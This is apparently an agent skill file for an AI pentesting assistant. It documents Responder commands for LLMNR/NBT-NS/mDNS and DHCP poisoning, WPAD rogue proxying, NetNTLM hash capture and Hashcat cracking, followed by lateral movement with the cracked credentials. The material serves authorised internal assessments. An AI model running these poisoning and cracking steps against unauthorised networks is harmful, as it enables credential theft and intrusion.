---
name: responder
description: Operator-assisted Responder workflows for LLMNR/NBT-NS/mDNS poisoning and NetNTLM hash capture on local networks
category: tools
tags: [network, credentials, poisoning, active-directory, operator-assisted]
---

# Responder

LLMNR, NBT-NS, and mDNS poisoner for capturing NetNTLM hashes and cleartext credentials on local networks. Poisons name resolution to redirect authentication to the attacker.

## When to Request

- When on the same network segment as target systems (internal assessment)
- To capture NetNTLM hashes for offline cracking
- For WPAD proxy abuse to intercept HTTP traffic
- When testing network-level name resolution security

## Operator-Assisted Workflow

1. Agent determines network position and poisoning objectives
2. Agent provides Responder configuration (interface, protocols, analysis mode)
3. Operator runs Responder and reports captured hashes and credentials
4. Agent directs hash cracking (Hashcat mode 5600 for NetNTLMv2)
5. Agent uses cracked credentials for lateral movement and further testing

## Key Commands

### Standard Poisoning
```
responder -I INTERFACE -wFb
```

### Analysis Mode (Passive)
```
responder -I INTERFACE -A
```

### Specific Protocols
```
responder -I INTERFACE -r -d -w
# -r: Enable answers for netbios wredir suffix queries
# -d: Enable answers for netbios domain suffix queries
# -w: Start WPAD rogue proxy server
```

### With DHCP Poisoning
```
responder -I INTERFACE -Pd
```

## Captured Data Locations
```
/usr/share/responder/logs/
# Files: HTTP-NTLMv2-IP.txt, SMB-NTLMv2-IP.txt, etc.
```

## Output Analysis

- **NetNTLMv2 hashes** -- crack with Hashcat (`-m 5600`) or relay with ntlmrelayx
- **NetNTLMv1 hashes** -- weaker; crack with Hashcat (`-m 5500`) or rainbow tables
- **Cleartext passwords** -- from HTTP Basic or WPAD proxy authentication
- **Machine accounts** -- computer$ hashes may enable silver ticket attacks
- **Frequency of captures** -- indicates LLMNR/NBT-NS usage patterns in the environment

## Integration with Strix

- Captured hashes feed into Hashcat for cracking (mode 5600/5500)
- Cracked credentials enable authenticated web application testing via Strix
- WPAD captures reveal internal proxy configurations and browsing patterns
- Machine account captures inform AD attack strategy (silver tickets, delegation)
